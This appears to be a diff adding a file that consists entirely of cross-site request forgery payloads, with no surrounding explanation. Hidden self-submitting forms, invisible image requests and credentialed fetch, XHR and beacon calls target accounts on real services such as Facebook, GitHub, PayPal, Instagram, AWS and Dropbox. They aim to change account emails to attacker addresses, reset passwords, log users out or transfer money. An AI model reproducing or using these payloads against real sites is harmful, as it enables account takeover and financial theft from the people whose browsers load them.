@@ -1,0 +1,64 @@
+<form action="https://bank.example.com/api/transfer" method="POST">
+  <input type="hidden" name="recipient" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+  <input type="submit" value="Click me">
+</form>
+
+<img src="https://mail.google.com/mail/u/0/?logout&hl=en" width="0" height="0">
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form target="csrf-frame" action="https://accounts.facebook.com/account/settings" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf" value="">
+</form>
+<script>document.forms[0].submit()</script>
+
+<script>
+  fetch('https://api.dropbox.com/1/account/settings', {
+    method: 'POST',
+    credentials: 'include',
+    body: JSON.stringify({email: 'hacker@evil.com'})
+  })
+</script>
+
+<body onload="document.forms[0].submit()">
+<form action="https://console.aws.amazon.com/iam/home" method="POST">
+  <input type="hidden" name="accessKeyId" value="AKIAHACKED">
+  <input type="hidden" name="secretAccessKey" value="YOUVEBEENHACKED">
+</form>
+</body>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://twitter.com/settings/account', true);
+  xhr.withCredentials = true;
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({phone_number: '+15555555555'}));
+</script>
+
+<form action="https://github.com/settings/emails" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="commit" value="Add">
+</form>
+
+<img src="https://www.paypal.com/myaccount/settings/email/add?email=attacker@evil.com&amp;confirmed=1" width="0" height="0">
+
+<form action="https://www.instagram.com/accounts/password/change/" method="POST" id="csrf-form">
+  <input type="hidden" name="old_password" value="anyvalue">
+  <input type="hidden" name="new_password1" value="hackedpassword123">
+  <input type="hidden" name="new_password2" value="hackedpassword123">
+</form>
+<script>document.getElementById('csrf-form').submit();</script>
+
+<form action="https://reddit.com/settings/update" method="POST">
+  <input type="hidden" name="email" value="hacked@evil.com">
+</form>
+
+<img src="https://outlook.office365.com/owa/?path=/options/changesettings" width="0" height="0">
+
+<script>
+  navigator.sendBeacon('https://cloud.digitalocean.com/v1/account', JSON.stringify({
+    email: 'hacker@evil.com',
+    password: 'hacked123'
+  }));
+</script>
